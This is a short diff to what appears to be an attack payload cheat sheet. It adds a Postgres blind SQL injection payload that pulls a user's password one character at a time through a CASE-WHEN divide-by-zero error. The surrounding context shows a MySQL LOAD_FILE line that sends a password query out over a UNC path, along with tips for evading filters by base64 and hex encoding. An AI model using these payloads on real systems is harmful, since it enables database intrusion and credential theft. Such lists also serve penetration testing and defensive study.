@@ -305,6 +305,14 @@ SELECT LOAD_FILE(CONCAT('\\\\', 'SELECT password FROM mysql.users WHERE user=\'r
 * Double-encode query in base64
 * Use HEX conversion 
 
+### Postgres
+
+**CASE-WHEN secret extraction**
+
+```
+(SELECT+CASE+WHEN+((SELECT+substring(password,1,1)+from+users+where+username='USERNAME')='a')+THEN+NULL::text+ELSE+cast+(1/(select+0)+as+text)+END)
+```
+
 ## XXE
 
 
